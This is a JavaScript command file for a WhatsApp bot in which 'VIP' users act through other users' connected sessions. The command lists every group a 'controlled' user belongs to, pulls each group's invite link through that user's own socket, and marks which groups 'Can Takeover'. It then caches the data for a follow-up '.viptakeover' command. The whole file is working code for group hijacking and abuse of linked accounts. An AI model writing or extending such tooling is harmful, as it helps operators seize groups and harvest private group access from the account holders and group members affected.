import { VIPQueries } from "../../database/query.js"
import { VIPHelper } from "../../whatsapp/index.js"

export default {
  name: "VIP Groups",
  description: "List all groups a controlled user is in",
  commands: ["vipgroups", "vipgrouplist"],
  category: "vipmenu",
  usage: "• `.vipgroups <phone>` - View user's groups",

  async execute(sock, sessionId, args, m) {
    try {
      const vipTelegramId = VIPHelper.fromSessionId(sessionId)
      if (!vipTelegramId) {
        await sock.sendMessage(m.chat, { text: "❌ Could not identify your session" }, { quoted: m })
        return
      }

      const vipStatus = await VIPQueries.isVIP(vipTelegramId)
      if (!vipStatus.isVIP) {
        await sock.sendMessage(m.chat, { text: "❌ You don't have VIP access." }, { quoted: m })
        return
      }

      // Parse target phone
      let targetPhone = null
      
      if (args.length > 0) {
        targetPhone = args[0].replace(/[@\s\-+]/g, '')
      }

      if (!targetPhone || !/^\d{10,15}$/.test(targetPhone)) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Please provide a valid phone number.\n\nUsage: `.vipgroups 2347067023422`" 
        }, { quoted: m })
        return
      }

      // Convert phone to telegram ID
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id

      // Check permission
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      if (!canControl.allowed) {
        const reasons = {
          'not_vip': 'You are not a VIP user',
          'target_is_vip': 'Cannot control other VIP users',
          'not_owned': 'You do not own this user'
        }
        await sock.sendMessage(m.chat, { 
          text: `❌ ${reasons[canControl.reason] || 'Permission denied'}` 
        }, { quoted: m })
        return
      }

      // Get target socket
      const targetSock = await VIPHelper.getUserSocket(targetTelegramId)
      if (!targetSock) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User ${targetPhone} is not currently connected.` 
        }, { quoted: m })
        return
      }

      // Get user's groups
      await sock.sendMessage(m.chat, { 
        text: `🔍 Fetching groups for ${targetPhone}...\n\nPlease wait...` 
      }, { quoted: m })

      const groups = await VIPHelper.getUserGroups(targetSock)

      if (groups.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: `📋 User ${targetPhone} is not in any groups.` 
        }, { quoted: m })
        return
      }

      // Build groups list with links
      let response = `📋 *Groups for ${targetPhone}*\n\n`
      response += `Total Groups: ${groups.length}\n\n`

for (let i = 0; i < groups.length; i++) {
  const group = groups[i]
  const link = await VIPHelper.getGroupInviteLink(targetSock, group.jid)
  
  response += `${i + 1}️⃣ *${group.name}*\n`
  response += `   👥 Members: ${group.participants}\n`
  
  // Show takeover status
  if (group.isBotOwner) {
    response += `   👑 Owner (Can Takeover)\n`
  } else if (group.canTakeover) {
    response += `   🔓 Admin - No Owner (Can Takeover)\n`
  } else {
    response += `   ⚠️ Admin - Has Owner (Cannot Takeover)\n`
  }
  
  if (link) {
    response += `   🔗 ${link}\n`
  }
  response += `   🆔 \`${group.jid}\`\n\n`
}

      response += `\n💡 *To Takeover:*\n`
      response += `Reply to this message with:\n`
      response += `\`.viptakeover <number>\`\n\n`
      response += `Example: \`.viptakeover 1\``

      const sentMsg = await sock.sendMessage(m.chat, { text: response }, { quoted: m })

      // Store groups data in message context for takeover command
      if (sentMsg && sentMsg.key) {
        // Store temporarily in a global map (you can use Redis or database for production)
        global.vipGroupsCache = global.vipGroupsCache || new Map()
        global.vipGroupsCache.set(sentMsg.key.id, {
          groups,
          targetPhone,
          targetTelegramId,  // IMPORTANT: Store telegram_id not phone
          vipTelegramId,
          timestamp: Date.now()
        })

        // Clean up after 10 minutes
        setTimeout(() => {
          global.vipGroupsCache.delete(sentMsg.key.id)
        }, 600000)
      }

      await VIPQueries.logActivity(vipTelegramId, 'view_groups', targetTelegramId, null, { 
        groupCount: groups.length 
      })

    } catch (error) {
      console.error("[VIPGroups] Error:", error)
      await sock.sendMessage(m.chat, { 
        text: "❌ Error fetching groups." 
      }, { quoted: m })
    }
  }
}